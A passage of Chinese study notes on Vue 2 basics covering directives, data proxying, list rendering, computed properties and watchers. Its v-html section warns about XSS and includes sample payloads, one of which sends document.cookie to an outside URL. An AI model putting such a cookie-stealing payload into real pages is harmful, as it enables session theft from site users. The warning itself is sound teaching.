# Vue
## 安装Vue
```javascript
// 第一种方案，使用npm安装，然后本地导入
npm install vue
// 第二种方案，直接使用cdn链接导入
<!-- 导入 Vue.js -->
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.min.js"></script>
```
同时Vue也分为开发版和生产环境版本，如果使用开发版本浏览器的控制台会输出警告信息
```
// 由于浏览器插件Vue Devtools extension没有生效而出现警告
Download the Vue Devtools extension for a better development experience:
https://github.com/vuejs/vue-devtools
// 由于使用了开发版本的Vue依赖
vue.js:9353 You are running Vue in development mode.
Make sure to turn on production mode when deploying for production.
See more tips at https://vuejs.org/guide/deployment.html
```
警告解决方案：

```javascript
// 第一个警告正常使用Vue，并安装浏览器插件即可解决
// 第二个警告 设置不打印Tip信息
Vue.config.productionTip = false;
```
另外，开发场景建议使用开发版本，获得更多的错误提示信息
## hello Vue

**vue声明式渲染**

-   想要让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
-   app容器内的代码依然符合html规范，只不过混入了一些特殊Vue的语法
-   app容器里面的代码被成为【Vue模板】
-   真实的开发过程中**只有一个**Vue实例，并且会配合着组件一起使用
-   插值表达式{{xxx}}中的xxx，要写js表达式，缺xxx可以自动获取到data中的所有属性
-   一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新
   
注意区分js表达式和js代码语句：
-   js表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，如a, a+b, func(), 三元表达式
-   js代码语句：如if，for之类的

可以在浏览器控制台修改vue实例对象的数据，如`vm.name = "lisi"`，此时插值表达式的数据也会变更

```javascript
    <div id="app">
        // {{}}是vue的插值表达式
        <h1>hello,{{name}}</h1>
    </div>
    <script>
        // 设置默认不提示
        Vue.config.productionTip = false; 
        let vm = new Vue({
            // 也可以使用document.getElementById('app') 
            'el':"#app", //element el指定当前vue实例为哪一个容器服务，值通常为css选择器格式
            'data':{
                'name':'张三'
            }
        })
    </script>
```

### 安装vue插件

- 首先打开浏览器的**开发者模式**选项
- 在扩展程序里搜索vue devtools
- 注意安装官方的版本

```javascript
// 使用方式（此处演示vue2版本）
// 方式一: 直接导入脚本，开发环境/生产环境选其一
<!-- 开发环境版本，包含了有帮助的命令行警告 -->
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
<!-- 生产环境版本，优化了尺寸和速度 -->
<script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
// 方式二：使用npm install vue之后在本地引入
npm install -g vue@2.6.14
// 引入
<script src="./node_modules/vue/dist/vue.js"></script>
// 就可以使用vue.js了
```
## 模板语法

-   插值语法用于解析标签体的内容，写法{{}}，是js表达式，可以直接读取data中的所有属性
-   指令语法:用于解析标签(标签体,标签属性, 绑定事件...)上，举例：`v-bind:href="xxx"`

```
    <div id="app">
        <h1>插值语法</h1>
        <h3>你好，{{name}}</h3>
        <h1>指令语法</h1>
        <a v-bind:href="url">点我百度一下</a>
        <h1>指令语法简写</h1>
        <a :href="url" :x="x.toUpperCase()">简写点我百度一下</a>
        <h3>学校：{{school.name}}</h3>
    </div>
    <script>
        new Vue({
            'el':'#app',
            'data':{
                'name':'jack',
                'url':'https://www.baidu.com',
                'x':'test v-bind',
                'school':{
                    'name':'测试学校'
                }
            }
        })
    </script>
```
## 指令

### v-model

v-model一般用于**表单项**或者自定义组件，页面变化=>数据变化，数据变化=>页面变化
```javascript
<div id="app">
    <!-- v-model指令与vue对象数据 双向绑定 -->
    <input type="text" v-model="num"></input>
    <!-- v-on click点击事件，修改num值，也可以触发方法 -->
    <button v-on:click="num++">点赞</button>
    <button v-on:click="reduce()">取消点赞</button>
    <h2>{{name}}非常帅，有{{num}}个人为他点赞</h2>
</div>
<script>
    let vm = new Vue({
        el: '#app',// 用来绑定div元素
        data: {
            name: 'zhangsan',
            num: 0
        },// 数据集合
        methods: {
            reduce() {
                this.num--;
            }
        }// 方法
    })
</script>
```
注意：
-   单向绑定(v-bind)：数据只能从data流向页面。
-   双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
    -   双向绑定一般都应用在表单类元素上（如：input、select等）
    -   v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

### v-html&v-text

```javascript
    <div id="app">
        <!-- 默认对标签进行转义，浏览器显示 <h2>hello</h2> -->
        {{msg}} <br />
        <!-- 插值表达式也可以进行计算或者调用方法，但是不能声明变量，如let a = 1 -->
        {{1 + 1}} {{getNum()}}<br />
        <!-- 使用 v-html 将显示 h2 标签大小的 hello-->
        <span v-html="msg"></span> <br />
        <!-- v-text 会将html标签转义，显示结果跟第一种插值表达式一样 -->
        <span v-text="msg"></span>
    </div>
    <script>
        let vm = new Vue({
            el: '#app',// 用来绑定div元素
            data: {
                msg: '<h2>hello</h2>',
                num: 0
            },// 数据集合
            methods: {
                reduce() {
                    this.num--;
                },
                getNum() {
                    return this.num;
                }
            }// 方法
        })
    </script>
```

### v-bind

```javascript
    <div id="app">
        <!-- 使用v-bind 对html标签的属性进行绑定，区别v-html/text只能绑定标签，不能绑定标签属性 -->
        <!-- 同时也能在浏览器控制台修改 vm.link 属性值 -->
        <a v-bind:href="link">gogogo</a>
        <!-- 普通语法 -->
        <span style="color: red;font-size: 60px;">hello1</span>
        <!-- vue单向绑定更改标签属性，但是使用浏览器检查元素修改代码 不会造成vue对象数据变动 -->
        <span v-bind:style={color:curColor,fontSize:curSize}>hello2</span>
        <!-- v-bind可以简写 : -->
        <span :style={color:curColor,fontSize:curSize}>hello3</span>
    </div>
    <br />

    <script>
        let vm = new Vue({
            el: '#app',
            data: {
                link: 'https://www.baidu.com',
                curColor: 'blue',
                curSize: '50px'
            },
            methods: {

            }
        })
    </script>
```

### v-on

v-on事件修饰符来管理事件的行为

- `.stop`：阻止事件冒泡到父元素
- `.prevent`：阻止默认事件发生
- `.capture`：使用事件捕获模式
- `.self`：只有event.target是当前操作的元素时才触发事件（冒泡或捕获都不执行）
- `.once`：事件只触发一次
- `.passive`：事件的默认行为立即执行，无需等待事件回调执行完毕

```html
    <div id="app">
        <h2>欢迎，{{name}}</h2>
        <div class="demo1" @click="aTagShowInfo">
            <!-- 使用@click.prevent阻止默认事件，a标签无法跳转 -->
            <a href="https://www.baidu.com" @click.prevent="aTagShowInfo">a标签->跳转到百度</a>
        </div>
        <div class="demo1" @click="showInfo">
            大div
            <!-- 使用@click.stop阻止事件的冒泡到大div，不会调用两次showInfo -->
            <button @click.stop="showInfo">大div中的小按钮</button>
        </div>
        <button @click.once="showInfo">点我提示信息,只在第一次点击生效</button>
        <!-- 事件默认是以冒泡的方式执行的，打印2->1，使用@click.capture就会让事件以捕获的方式执行，打印1->2 -->
        <div class="box1" @click.capture="showMsg(1)">
            大div
            <div class="box2" @click="showMsg(2)">小div</div>
        </div>
        <!-- 使用@click.self也可阻止事件的冒泡行为，因为只有event.target是当前操作的元素时才触发事件 -->
        <div class="box1" @click.self="showEventTarget">
            大div
            <div class="box2" @click="showEventTarget">小div</div>
        </div>
        <!-- wheel：鼠标滚轮的滚动事件，scroll：滚动条的滚动事件 -->
        <!-- 使用passive事件的默认行为立即执行，无需等待事件回调showData方法执行完毕； -->
        <ul class="list" @wheel.passive="showData">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data() {
                return {
                    name: 'Jack'
                }
            },
            methods: {
                aTagShowInfo(e) {
                    // 阻止事件的默认行为，可以让a标签无法跳转，另外可以使用vue的写法@click.prevent
                    // e.preventDefault()
                    alert('开始学习...')
                },
                showInfo(e) {
                    alert('提示信息')
                },
                showMsg(msg) {
                    console.log(msg);
                },
                showEventTarget(e) {
                    console.log(e.target);
                },
                showData() {
                    for (let i = 0; i < 10000; i++) {
                        console.log(i)
                    }
                    console.log('累坏了');
                }
            }
        })
    </script>
```

**补充**：
-   keyup和keydown区别：keyup是按下按键，按键抬起时触发事件，而keydown是按下就触发事件
-   Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
-   按键修饰符：`enter,tab,delete,esc,space,up,down,left,right`
-   系统修饰键（用法特殊）：ctrl、alt、shift、meta
    -   配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
    -   配合keydown使用：正常触发事件。


### v-for
-   用于展示列表数据
-   语法：v-for="(item, index) in xxx" :key="yyy"
-   可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```javascript
    <div id="app">
        <!-- 遍历数组, key一定不要重复, 不然会报错 -->
        <h2>基本列表</h2>
        <ul>
            <li v-for="(item, index) in personList" :key="index">
                {{item.id}}-{{item.name}}-{{item.age}}
            </li>
        </ul>
        <!-- 遍历对象 -->
        <h2>car信息</h2>
        <ul>
            <li v-for="(value, key) in car" :key="key">
                {{key}}-{{value}}
            </li>
        </ul>
        <!-- 遍历字符串 -->
        <h2>字符串</h2>
        <ul>
            <li v-for="(char, index) in str" :key="index">
                {{index}}-{{char}}
            </li>
        </ul>
        <!-- 遍历指定次数 -->
        <h2>指定次数</h2>
        <ul>
            <li v-for="(num, index) in 5" :key="index">
                {{index}}-{{num}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                personList: [
                    { id: '001', name: '张三', age: 20 },
                    { id: '002', name: '李四', age: 16 },
                    { id: '003', name: '王五', age: 28 }
                ],
                car: {
                    name: '小米',
                    price: '21.99w',
                    color: '黑色'
                },
                str: 'hello'
            }
        })
    </script>
```

### v-if&v-show

条件渲染：

`v-if`
-   写法：
    -   `v-if="表达式"`
    -   `v-else-if="表达式"`
    -   `v-else="表达式"`
-   适用于：切换频率较低的场景。
-   特点：不展示的DOM元素直接被移除。
-   注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

`v-show`
-   写法：v-show="表达式"
-   适用于：切换频率较高的场景
-   特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

**备注**：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到

**v-if和v-show区别**：v-if代码直接消失，而v-show代码依旧存在，只是`display: none;`不展示

```javascript
    <div id="app">
        <h2>{{name}}</h2>
        <h2>当前n的值为:{{n}}</h2>
        <button @click="n++">点我n++</button>
        <!-- 使用v-show进行条件渲染 -->
        <h2 v-show="n===1">JAVA</h2>
        <h2 v-show="n===2">C++</h2>
        <h2 v-show="n===3">PYTHON</h2>
        <!-- 使用v-if联合v-else-if和v-else进行条件渲染 -->
        <h2 v-if="n===1">Vue</h2>
        <h2 v-else-if="n===2">React</h2>
        <h2 v-else="n===3">Angular</h2>
        <!-- 如果需要同时显示/隐藏多个标签，使用template和v-if，但是不能使用v-show -->
        <template v-if="n===1">
            <h2>北京</h2>
            <h2>上海</h2>
            <h2>深圳</h2>
        </template>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                name: '条件渲染',
                n: 0
            }
        })
    </script>
```
### v-text&v-html

v-text指令：
-   作用：向其所在的节点中渲染文本内容。 (纯文本渲染不会加载成标签样式啥的)
-   与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。这里有点不太灵活

v-html指令：
-   作用：向指定节点中渲染包含html结构的内容。
-   与插值语法的区别：
    -   v-html会替换掉节点中所有的内容，{{xx}}则不会。
    -   v-html可以识别html结构。
-   严重注意：v-html有安全性问题！！！！
    -   在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
    -   一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```javascript
<div id="app">
    {{name}}
    <!--如果name没有标签样式,与上面展示一样的结果-->
    <div v-text="name"></div>
    <!--不展示 你好, 文字-->
    <div v-text="name">你好，</div>
    <div v-text="str"></div>
    <!--会加载成标签,而不是纯文字-->
    <div v-html="str"></div>
    <div v-html="hackStr1"></div>
    <div v-html="hackStr2"></div>
    <div v-html="hackStr3"></div>
</div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            name: '张三',
            str: '<h2>哈哈哈</h2>',
            hackStr1: '<a href=https://www.baidu.com>去百度一下把</a>',
            hackStr2: '<a href=javascript:alert(1)>xss攻击</a>',
            // 如果该cookie设置了httponly属性等于true,则无法通过js代码获取cookie信息
            hackStr3: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>xdm冲啊</a>'
        }
    })
</script>
```

### v-cloak

v-cloak指令（没有值）：
-   本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
-   使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```javascript
<div id="app">
    <!--先出现插值表达式，再渲染数据-->
    <h2>{{name}}</h2>
    <!--使用css把v-cloak设置为不展示-->
    <h2 v-cloak>{{name}}</h2>
</div>
<!--注意要放在div外面-->
<!--使用node启动js文件夹里的server.js-->
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
<script>
    console.log(111)
    const vm = new Vue({
        el: '#app',
        data: {
            name: 'hello'
        }
    })
</script>
```

### v-once

v-once指令：
-   v-once所在节点在初次动态渲染后，就视为静态内容了。
-   以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```javascript
<div id="app">
    <!--v-once在动态渲染之后就不变了-->
    <h2 v-once>初始化的值为：{{n}}</h2>
    <h2>当前的值为：{{n}}</h2>
    <button @click="n++">点击+1</button>
</div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            n: 1
        }
    })
</script>
```

### v-pre
v-pre指令：
-   跳过其所在节点的编译过程。
-   可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```javascript
<div id="app">
    <!--对于普通文本，没有区别-->
    <h2 v-pre>hello Vue</h2>
    <!--直接当前普通文本，不会被vue解析-->
    <h2 v-pre>当前的值为：{{n}}</h2>
    <button @click="n++">点击+1</button>
</div>
<script>
    const vm = new Vue({
        el: '#app',
        data: {
            n: 1
        }
    })
</script>
```

## 自定义指令

-   定义语法：
    -   局部指令：
            new Vue({directives:{指令名:配置对象} })   或  new Vue({directives: {指令名:回调函数}})
    -   全局指令：
            Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)

-   配置对象中常用的3个回调：
    -   bind：指令与元素成功绑定时调用。
    -   inserted：指令所在元素被插入页面时调用。
    -   update：指令所在模板结构被重新解析时调用。

-   备注：
    -   指令定义时不加v-，但使用时要加v-；
    -   指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
    -   在自定义指令的方法中，this指向的是window，而不是vm

[代码](https://github.com/zengten/Learn-Front-End/tree/main/vue-base/32-custom-directive.html)

## 补充点
### el和data的写法

-   el的两种写法：
    -   new Vue时配置el属性
    -   先创建Vue实例，然后再通过`vm.$mount('#app')`指定el的值
```javascript
new Vue({
    // 第一种写法
    'el':'#app',
    'data':{
        'name':'Jack'
    }
})
// 第二种写法
vm.$mount('#app')
```
-   data的两种写法：目前选择哪种写法都可以，学习组件式则需要使用函数式
    -   对象式，在new Vue时直接配置
    -   函数式
```javascript
// 第一种写法：普通函数返回对象
'data': function () {
    // 此时this是Vue实例
    console.log('当前this:', this);
    return {
        'name': 'Jack'
    }
}

// 第二种写法：箭头函数返回对象   
'data': () => {
    // 此时this是window对象
    console.log('当前this:', this);
    return {
        'name': 'Jack'
    }
}
// 第三种写法：改成data函数
data() {
    // 此时this是Vue实例
    console.log('当前this:', this);
    return {
        'name': 'Jack'
    }
}
```
-   重要原则：由Vue管理的函数，一定不要写箭头函数，写了箭头函数后this就会不再是Vue实例了

### MVVM模型
MVVM模型
-   M：模型(Model) ：data中的数据
-   V：视图(View) ：模板代码
-   VM：视图模型(ViewModel)：Vue实例

观察发现：
-   data中所有的属性，最后都出现在了vm身上。
-   vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```
<div id="app">
    <!-- vue实例上的属性都能通过差值表达式取到，包括原型对象上面的（prototype） -->
    <h2>hello, {{name}}</h2>
    <h2>测试一下1, {{_c}}</h2>
    <h2>测试一下2, {{_render}}</h2>
</div>
<script>
    const vm = new Vue({
        'data': {
            'name': 'jack'
        }
    })
    vm.$mount('#app')
    console.log(vm);
</script>
```
### Object.defineProperty

学习Object.defineProperty Api
```javascript
let person = {
    name: '张三',
    sex: '男'
}
// 添加age字段，默认不可枚举，修改和删除
Object.defineProperty(person, 'age', {
    // 直接给age赋值
    value: 20
})
// 数据遍历中，age没有出现
Object.entries(person).forEach(([key, value]) => {
    console.log(`key = ${key}, value = ${value}`)
})
```
```javascript
// 修改这个api的配置
Object.defineProperty(person, 'age', {
    value: 20,
    enumerable: true, // 此时代表这个属性是可以枚举的
    writable: true, // 代表可以重写该属性(控制属性是否被修改)
    configurable: true, //控制属性是否可以被删除 默认为false
})
```
需求：实现一个变量的修改，同时修改对象内的某个字段？
```javascript
// 使用Object.defineProperty将currentAge和person的age进行绑定
let currentAge = 25
let person = {
    name: '张三',
    sex: '男'
}
// 数据代理，当读取age的值时会调用get方法，当修改age时会调用set方法
Object.defineProperty(person, 'age', {
    get: function() {
        console.log('get invoke...');
        return currentAge
    },
    set(value) {
        console.log('set invoke...');
        currentAge = value
    }
})
```
需求：实现一个数据代理，通过一个对象代理另一个对象中属性的操作
```javascript
let obj1 = {
    'x': 10
}
let obj2 = {
    'y': 20
}
// 修改obj1的x属性会影响obj2，反向也是
Object.defineProperty(obj2, 'x', {
    get() {
        return obj1.x
    },
    set(value) {
        obj1.x = value
    }
})
```
验证Vue对象中的_data和自定义的data是否相同对象数据，data===vm_data
```javascript
// 修改data对象，会同时影响vm._data
let data
let vm = new Vue({
    'el': '#app',
    data() {
        return data = {
            'name': 'zhangsan',
            'age':12
        }
    }
})
console.log(vm)
```
### 列表中key的作用

react、vue中的key有什么作用？（key的内部原理）
-   虚拟DOM中key的作用：
    -   key是虚拟DOM对象的标识，
    -   当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】
    -   随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

-   对比规则：
    -   旧虚拟DOM中找到了与新虚拟DOM相同的key：
        -   若虚拟DOM中内容没变, 直接使用之前的真实DOM！
        -   若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
    -   旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到到页面。

-   用index作为key可能会引发的问题：
    -   若对数据进行：逆序添加、逆序删除等破坏顺序操作:
        -   会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
    -   如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。

-   开发中如何选择key?:
    -   最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
    -   如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

```javascript
    <div id="app">
        <h2>人员列表</h2>
        <ul>
            <!--key唯一标识: 身份证，属性key是被vue给征用的，并不反应在真实dom上-->
            <li v-for="(item, index) in personList" :key="item.id">
                {{item.id}}-{{item.name}}-{{item.age}}
                <input type="text">
            </li>
        </ul>
        <button @click.once="addPerson">添加一个用户</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                personList: [
                    { id: '001', name: '张三', age: 20 },
                    { id: '002', name: '李四', age: 16 },
                    { id: '003', name: '王五', age: 28 }
                ]
            },
            methods: {
                addPerson() {
                    // 数组头部添加一个元素
                    this.personList.unshift({ id: '004', name: '赵六', age: 53 })
                }   
            }
        })
    </script>
```
### 列表过滤
-   分别使用计算属性和监视器实现
```javascript
    <div id="app">
        <h2>人员列表</h2>
        监视器实现：<input type="text" v-model="keyWordWatch"><br /><br />
        <ul>
            <li v-for="(item, index) in filterPersonList" :key="item.id">
                {{item.id}}-{{item.name}}-{{item.age}}
            </li>
        </ul>
        计算属性实现：<input type="text" v-model="keyWordComputed"><br /><br />
        <ul>
            <li v-for="(item, index) in computedPersonList" :key="item.id">
                {{item.id}}-{{item.name}}-{{item.age}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                keyWordWatch: '',
                keyWordComputed: '',
                personList: [
                    { id: '001', name: '张三', age: 20, gender: '男' },
                    { id: '002', name: '李四', age: 16, gender: '女' },
                    { id: '003', name: '王五', age: 28, gender: '男' }
                ],
                filterPersonList: []
            },
            watch: {
                keyWordWatch: {
                    // 页面初始化也调用一次，进行空字符的筛选
                    immediate: true,
                    // 注意任意 字符串.indexOf('') = 0; 也就是任意字符串都包含空字符
                    handler(val) {
                        console.log('触发监视器...' + val);
                        this.filterPersonList = this.personList.filter(item =>
                            item.name.indexOf(this.keyWordWatch) !== -1
                        );
                    }
                }
            },
            computed: {
                computedPersonList() {
                    return this.personList.filter(item => item.name.indexOf(this.keyWordComputed) !== -1);
                }
            }
        })
    </script>
```
### 列表排序
```javascript
    <div id="app">
        <!-- 同时使用计算属性实现排序 + 关键字搜索 -->
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyword"/>
        排序方式：
        <button @click="sortType = 1">年龄降序排序</button>
        <button @click="sortType = 2">年龄升序排序</button>
        <ul>
            <li v-for="(item, index) in filterPersonList" :key="index">
                {{item.id}}-{{item.name}}-{{item.age}}
                <input type="text">
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                keyword: '',
                sortType: 0,
                personList: [
                    { id: '001', name: '张三', age: 20, gender: '男' },
                    { id: '002', name: '李四', age: 16, gender: '女' },
                    { id: '003', name: '王五', age: 28, gender: '男' },
                    { id: '004', name: '王力宏', age: 37, gender: '男' }
                ]
            },
            computed: {
                filterPersonList() {
                    const arr = this.personList.filter(item => item.name.indexOf(this.keyword) !== -1);
                    // 判断是否需要排序
                    if (!this.sortType) {
                        return arr;
                    }
                    // sort会改变的原数组
                    return arr.sort((p1, p2) => this.sortType == 1 ? (p2.age - p1.age) : (p1.age - p2.age));
                }
            }
        })
    </script>
```
### 更新数据时出现问题

直接使用对象更新就会导致页面没有渲染数据，最好使用数组的api或者直接更新对象的属性
```javascript
    <div id="app">
        <button @click="changeData1">更新第一条数据</button><br>
        <button @click="changeData2">添加一条数据</button><br>
        <button @click="changeData3">api更新第一条数据</button><br>
        <ul>
            <li v-for="(item, index) in personList" :key="index">
                {{item.id}}-{{item.name}}-{{item.age}}
                <input type="text">
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                keyword: '',
                sortType: 0,
                personList: [
                    { id: '001', name: '张三', age: 20, gender: '男' },
                    { id: '002', name: '李四', age: 16, gender: '女' },
                    { id: '003', name: '王五', age: 28, gender: '男' }
                ]
            },
            methods: {
                changeData1() {
                    // 直接使用对象更新就会导致页面没有渲染数据
                    // this.personList[0] = { id: '004', name: '张三丰', age: 55, gender: '男' };
                    // 使用对象里面的字段更新，才会渲染，因为有数据劫持
                    this.personList[0].name = '张三丰';
                    this.personList[0].age = 55;
                }, 
                changeData2() {
                    // 另外使用数组api也能渲染
                    this.personList.unshift({ id: '004', name: '张三丰', age: 55, gender: '男' });
                }, 
                changeData3() {
                    // 使用数组api修改，在第0个位置删除1个元素，并添加一个
                    this.personList.splice(0, 1, { id: '001', name: '张三丰', age: 55, gender: '男' });
                }
            },
        })
    </script>
```

### 模拟Vue的数据监测

```javascript
    <script>
        let data = {
            name: '张三'
        }
        // 错误写法，读取name属性时，无限递归调用getter
        // Object.defineProperty(data, 'name', {
        //     get() {
        //         return data.name;
        //     },
        //     set(val) {
        //         data.name = val;
        //         console.log('name被改变了');
        //     }
        // })

        // 观察者
        function Observer(obj) {
            // 遍历对象中所有的key，缺点没有嵌套实现
            const keys = Object.keys(obj);
            keys.forEach(key => {
                Object.defineProperty(this, key, {
                    get() {
                        console.log(`读取${key}的值`);
                        return obj[key];
                    },
                    set(val) {
                        console.log(`修改${key}的值`);
                        obj[key] = val;
                    }
                })
            })
        }

        let vm = {}
        // 必须使用 new 构造函数的方式
        const obs = new Observer(data);
        vm._data = data = obs;
        console.log(data);
    </script>
```

### 数据监测Vue监视数据的原理：
-   vue会监视data中所有层次的数据。
-   如何监测对象中的数据？
    -   通过setter实现监视，且要在new Vue时就传入要监测的数据。
        -   对象中后追加的属性，Vue默认不做响应式处理
    	-   如需给后添加的属性做响应式，请使用如下API：
`Vue.set(target，propertyName/index，value)` 或`vm.$set(target，propertyName/index，value)`

-   如何监测数组中的数据？
    -   通过包裹数组更新元素的方法实现，本质就是做了两件事：
        -   调用原生对应的方法对数组进行更新。
        -   重新解析模板，进而更新页面。

-   在Vue修改数组中的某个元素一定要用如下方法：
    -   使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
    -   Vue.set() 或 vm.$set()

-   特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
-   数据劫持可以理解成为vue对你写在data的数据会进行加工，让它们都变成响应式的

总结的**练习**：
```javascript
    <div id="app">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
        <h3>姓名：{{student.name}}</h3>
        <h3>年龄：{{student.age}}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">
                {{h}}
            </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">
                {{f.name}}--{{f.age}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
                    hobby: ['喝酒', '抽烟', '烫头'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
                addSex() {
                    // 两种方式响应式添加性别
                    // Vue.set(this._data.student, 'sex', '男');
                    this.$set(this._data.student, 'sex', '女');
                },
                updateSex() {
                    this.student.sex = '男';
                },
                addFriend() {
                    this.student.friends.unshift({ name: '新盆友', age: 66 });
                },
                updateFirstFriendName() {
                    this.student.friends[0].name = '张三';
                },
                addHobby() {
                    this.student.hobby.push('打篮球');
                },
                updateHobby() {
                    this.student.hobby.splice(0, 1, '开车');
                },
                removeSmoke() {
                    this.student.hobby = this.student.hobby.filter(item => item !== '抽烟');
                }
            }
        })
    </script>
```

## 计算属性
计算属性：
-   定义：要用的属性不存在，要通过已有属性计算得来。
-   原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
-   get函数什么时候执行？
    -   初次读取时会执行一次。
    -   当依赖的数据发生改变时会被再次调用。
-   优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
-   补充：
    -   计算属性最终会出现在vm上（而不是出现在`vm._data`上），直接读取使用即可。
    -   如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
```javascript
    <div id="app">
        姓：<input type="text" v-model="firstName"><br><br>
        名：<input type="text" v-model="lastName"><br><br>
        全名：<span>{{fullName}}</span><br><br>
        <!-- 多次使用fullName，只执行一次计算属性的get方法，之后有缓存 -->
        全名：<span>{{fullName}}</span><br><br>
        全名：<span>{{fullName}}</span><br><br>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                firstName: '张',
                lastName: '三'
            },
            computed: {
                // 完整写法
                // fullName: {
                //     get() {
                //         console.log('fullName get被调用...');
                //         return this.firstName + '-' + this.lastName;
                //     },
                //     set(value) {
                //         // 控制台执行 vm.fullName='李-四' 就会调用这个方法
                //         console.log('fullName set被调用...');
                //         const{firstName, lastName} = value.split('-');
                //         this.firstName = firstName;
                //         this.lastName = lastName;
                //     }
                // }
                // 简写（没有set的情况下）
                fullName() {
                    console.log('fullName get被调用...');
                    return this.firstName + '-' + this.lastName;
                }
            }
        })
    </script>
```

## 监视器watch
监视器可以侦听属性的变化
基本使用：
```javascript
watch: {
    // 监视的配置对象, watch不仅能监视data的普通属性，也可以检测计算属性
    isHot: {
        // 当这个属性为true时，页面刚渲染就运行handler函数，默认false
        immediate: true,
        // handler啥时候调用呢？
        // 当isHot发生改变就会调用该函数
        // handler接收两个参数，一个是这个状态参数改变前的值，另一个是改变后的旧值
        handler(newValue, oldValue) {
            console.log(`isHot监视器, newValue = ${newValue}, oldValue = ${oldValue}`);
        }
    }
    // 简写 前提:不使用immediate等额外属性
    isHot(newValue, oldValue) {
        console.log(`isHot监视器, newValue = ${newValue}, oldValue = ${oldValue}`);
    }
}
```
第二种写法，使用vm实现
```javascript
// 监视器第二种写法
vm.$watch('flag', {
    immediate: true,
    handler(newValue, oldValue) {
        console.log(`flag监视器, newValue = ${newValue}, oldValue = ${oldValue}`);
    }
});
// 简写
vm.$watch('flag', function (newValue, oldValue) {
    console.log(`flag监视器, newValue = ${newValue}, oldValue = ${oldValue}`);
});
```
深度监视器：
```javascript
const vm = new Vue({
    el: '#app',
    data: {
        numbers: {
            a: 1,
            b: 2
        }
    },
    watch: {
        // 对numbers整个对象进行监视，任意元素变化都会执行handler
        numbers: {
            deep: true,
            // 为啥深度监视器不能获取oldValue.a旧值?
            // 因为深度监视器是浅拷贝，只是对比val地址变化，不会保留对象的整个历史记录
            handler(newValue, oldValue) {
                console.log(`numbers深度监视器a, newValue = ${newValue.a}, oldValue = ${oldValue.a}`);
                console.log(`numbers深度监视器b, newValue = ${newValue.b}, oldValue = ${oldValue.b}`);
            }
        },
        'numbers.a': {
            handler(val, oldVal) {
